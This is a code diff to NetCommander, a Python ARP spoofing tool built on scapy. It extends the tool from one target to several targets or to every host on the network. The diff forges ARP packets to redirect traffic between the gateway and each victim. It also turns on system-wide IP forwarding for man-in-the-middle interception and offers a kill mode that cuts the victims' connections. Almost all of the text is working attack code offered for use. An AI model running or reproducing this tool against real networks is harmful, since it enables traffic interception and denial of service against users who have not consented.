@@ -47,15 +47,13 @@ class NetCmd:
     fd.write( '1' if status == True else '0' )
     fd.close()
 
-
   def __init__( self, interface, kill = False ):
     # scapy, you're pretty cool ... but shut the fuck up bitch!
     conf.verb = 0
 
     self.interface  = interface
     self.network    = None
-    self.target     = None
-    self.target_hw  = None
+    self.targets    = [] 
     self.gateway    = None
     self.gateway_hw = None
     self.packets    = []
@@ -108,20 +106,23 @@ class NetCmd:
     while choice is None:
       for i, item in enumerate( self.endpoints ):
         print "  [%d] %s %s" % ( i, item[0], item[1] )
-      choice = raw_input( "@ Choose [0-%d] : " % (len(self.endpoints) - 1) )
+      choice = raw_input( "@ Choose [0-%d] (* to select all): " % (len(self.endpoints) - 1) )
       try:
-        choice = int(choice)
-        self.target_hw = self.endpoints[ choice ][0]
-        self.target    = self.endpoints[ choice ][1] 
-      except:
+        choice = choice.strip()
+        if choice == '*':
+          self.targets = self.endpoints
+        else:
+          self.targets.append( self.endpoints[ int(choice) ] )
+      except Exception as e:
         print "@ Invalid choice!"
         choice = None
     
-    # craft the packets to accomplish a full forwarding:
+    # craft packets to accomplish a full forwarding:
     #   gateway -> us -> target
     #   target  -> us -> gateway
-    self.packets.append( Ether( dst = self.gateway_hw ) / ARP( op = "who-has", psrc = self.target,  pdst = self.gateway ) )
-    self.packets.append( Ether( dst = self.target_hw )  / ARP( op = "who-has", psrc = self.gateway, pdst = self.target ) )
+    for target in self.targets:
+      self.packets.append( Ether( dst = self.gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = self.gateway ) )
+      self.packets.append( Ether( dst = target[0] )       / ARP( op = "who-has", psrc = self.gateway, pdst = target[1] ) )
 
     if not kill:
       print "@ Enabling ipv4 forwarding system wide ..."
@@ -137,15 +138,15 @@ class NetCmd:
       sendp( packet, iface_hint = self.gateway )
 
 try:
-  print "\n\tNetCommander 1.0 - An easy to use arp spoofing tool.\n \
+  print "\n\tNetCommander 1.1 - An easy to use arp spoofing tool.\n \
 \tCopyleft Simone Margaritelli <evilsocket@gmail.com>\n \
 \thttp://www.evilsocket.net\n\thttp://www.backbox.org\n";
          
   parser = OptionParser( usage = "usage: %prog [options]" )
 
   parser.add_option( "-I", "--iface", action="store",      dest="iface", default=None,  help="Network interface to use." );
-  parser.add_option( "-K", "--kill",  action="store_true", dest="kill",  default=False, help="Kill target connections instead of forward them." )
-  parser.add_option( "-D", "--delay", action="store",      dest="delay", default=1,     help="Delay in seconds between one arp packet and another, default is 1." )
+  parser.add_option( "-K", "--kill",  action="store_true", dest="kill",  default=False, help="Kill targets connections instead of forwarding them." )
+  parser.add_option( "-D", "--delay", action="store",      dest="delay", default=5,     help="Delay in seconds between one arp packet and another, default is 5." )
   
   (o,args) = parser.parse_args()
   
